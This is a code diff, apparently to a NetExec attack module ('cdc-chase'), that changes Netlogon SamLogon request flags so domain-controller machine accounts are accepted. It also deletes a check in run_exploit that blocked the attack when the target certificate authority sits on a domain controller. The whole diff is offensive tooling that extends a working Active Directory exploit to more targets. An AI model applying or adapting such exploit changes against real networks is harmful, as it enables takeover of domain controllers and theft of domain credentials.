@@ -240,7 +240,7 @@ class NLOracle:
         req["LogonInformation"]["tag"] = req["LogonLevel"]
         ident = req["LogonInformation"]["LogonNetworkTransitive"]["Identity"]
         ident["LogonDomainName"] = auth_response["domain_name"].decode("utf-16le")
-        ident["ParameterControl"] = 2**11
+        ident["ParameterControl"] = 0x800 | 0x20  # K allows computer accounts, E allows DC (server-trust) accounts when the CA is on a DC
         ident["UserName"] = auth_response["user_name"].decode("utf-16le")
         ident["Workstation"] = ""
         req["LogonInformation"]["LogonNetworkTransitive"]["LmChallenge"] = challenge
@@ -908,12 +908,6 @@ class NXCModule:
     def run_exploit(self, cas):
         ca = self.select_target_ca(cas)
         if not ca:
-            return
-
-        # cdc-chase fails if the CA is on a DC: chased auth uses a machine account that NetrLogonSamLogon rejects
-        ca_on_dc = self.connection.search(searchFilter=f"(&(objectCategory=computer)(dNSHostName={ca['dNSHostName']})(userAccountControl:1.2.840.113556.1.4.803:=8192))", attributes=["dNSHostName"])
-        if parse_result_attributes(ca_on_dc):
-            self.context.log.fail(f"CA '{ca['cn']}' runs on a DC ({ca['dNSHostName']}), cdc-chase requires a CA on a member server")
             return
 
         dc_info = self.get_target_dc()
